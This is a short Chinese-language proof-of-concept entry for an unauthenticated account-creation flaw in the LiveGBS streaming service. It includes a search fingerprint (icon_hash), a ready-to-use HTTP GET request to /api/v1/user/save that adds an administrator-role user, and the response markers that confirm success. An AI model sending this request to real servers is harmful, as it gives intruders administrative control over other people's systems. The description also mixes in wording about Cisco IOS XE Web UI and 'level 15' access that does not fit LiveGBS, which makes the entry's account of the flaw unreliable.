﻿# LiveGBS 流媒体服务 添加用户

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：LiveGBS save接口处存在逻辑缺陷漏洞，当Cisco IOS XE Web UI在互联网公开时，恶意攻击者可能会利用此漏洞添加具有15级访问权限的账户，使服器处于继不安全的状态  

> 漏洞特征：icon_hash="-206100324"

> 验证脚本：HTTP

```
GET /api/v1/user/save?ID=&Username=dudesuite&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
Connection: close
```

> 响应代码特征：200

> 响应内容特征：password

> 上传文件定位：

> 验证文件来源：LiveGBS 流媒体服务 添加用户.poc

